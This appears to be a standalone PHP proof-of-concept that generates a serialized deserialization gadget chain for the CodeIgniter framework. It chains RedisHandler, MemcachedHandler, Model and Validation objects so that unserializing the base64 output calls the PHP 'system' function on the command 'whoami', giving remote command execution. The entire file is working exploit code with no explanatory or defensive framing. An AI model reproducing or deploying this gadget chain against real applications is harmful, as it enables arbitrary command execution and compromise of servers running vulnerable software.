<?php

namespace CodeIgniter\Cache\Handlers{
    class RedisHandler{
        function __construct($class)
        {
            $this->redis = $class; //new CodeIgniter\Session\Handlers\MemcachedHandler($model)
        }
    }
}

namespace CodeIgniter\Session\Handlers{
    class MemcachedHandler{
        function __construct($class)
        {
            $this->lockKey = "whoami";  //$id
            $this->memcached = $class; //new CodeIgniter\Model($basebuilder, $validation)
        }
    }
}


namespace CodeIgniter{
    class Model{
        function __construct($class1, $class2)
        {
            $this->beforeDelete = array('validate');
            $this->validationMessages = array();
            $this->cleanValidationRules = false;
            $this->validationRules = array(
                "id" => array(
                    "system"
                )
            );
            $this->skipValidation = false;
            $this->primaryKey = null;
            $this->builder = $class1;  //new CodeIgniter\Database\MySQLi\Builder($connection)
            $this->validation = $class2;  //new CodeIgniter\Validation\Validation()
        }
    }
}

namespace CodeIgniter\Database{
    class BaseBuilder{
    }
}

namespace CodeIgniter\Validation{
    class Validation{
        function __construct(){
            $this->ruleSetFiles = array("Config\Database");
        }
    }
}

namespace{
    $basebuilder = new CodeIgniter\Database\BaseBuilder();
    $validation = new CodeIgniter\Validation\Validation();
    $model = new CodeIgniter\Model($basebuilder, $validation);
    $MemcachedHandler = new CodeIgniter\Session\Handlers\MemcachedHandler($model);
    $handles = new CodeIgniter\Cache\Handlers\RedisHandler($MemcachedHandler);
    echo base64_encode(serialize($handles));
}